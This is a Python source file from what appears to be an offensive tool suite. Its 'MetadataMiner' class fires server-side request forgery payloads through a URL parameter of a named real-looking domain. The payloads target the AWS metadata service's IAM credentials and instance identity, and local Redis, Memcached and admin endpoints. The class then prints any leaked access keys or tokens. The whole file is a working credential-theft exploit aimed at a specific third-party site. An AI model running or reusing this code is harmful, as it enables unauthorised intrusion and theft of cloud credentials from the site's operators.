import asyncio
import httpx
from aura.ui.formatter import console

class MetadataMiner:
    def __init__(self, vulnerable_url):
        self.vulnerable_url = vulnerable_url
        self.headers = {"User-Agent": "Mozilla/5.0"}
        self.payloads = [
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            "http://169.254.169.254/latest/meta-data/hostname",
            "http://169.254.169.254/latest/meta-data/instance-id",
            "http://169.254.169.254/latest/dynamic/instance-identity/document",
            "http://127.0.0.1:6379", # Redis
            "http://127.0.0.1:11211", # Memcached
            "http://localhost:8080/admin"
        ]

    async def probe_ssrf(self, client, payload):
        target = f"{self.vulnerable_url}{payload}"
        console.print(f"[*] Metadata Miner: Probing SSRF payload -> {payload}")
        try:
            r = await client.get(target, timeout=10)
            if r.status_code == 200:
                content = r.text.lower()
                is_hit = False
                
                # AWS Metadata hits
                if "accesskeyid" in content or "secretaccesskey" in content or "token" in content:
                    is_hit = True
                    console.print(f"  [bold red][!!!] BINGO: AWS Credentials Leaked![/bold red]")
                elif len(content) > 0 and r.status_code == 200:
                    # Check for generic AWS instance data
                    if re.search(r"i-[a-z0-9]+", content) or "ami-" in content:
                        is_hit = True
                        console.print(f"  [bold red][!!!] BINGO: Instance Metadata Leaked![/bold red]")
                
                if is_hit:
                    console.print(f"    -> Response: {r.text[:500]}")
                    return True
            elif r.status_code == 403:
                # console.print(f"  [yellow][.] Forbidden: {payload}[/yellow]")
                pass
        except: pass
        return False

    async def run(self):
        console.print(f"[*] Metadata Miner: Auditing {self.vulnerable_url} for Cloud/Internal Leakage...")
        async with httpx.AsyncClient(verify=False) as client:
            tasks = [self.probe_ssrf(client, p) for p in self.payloads]
            await asyncio.gather(*tasks)

if __name__ == "__main__":
    import re
    miner = MetadataMiner("https://glow.imoulife.com/?url=")
    asyncio.run(miner.run())
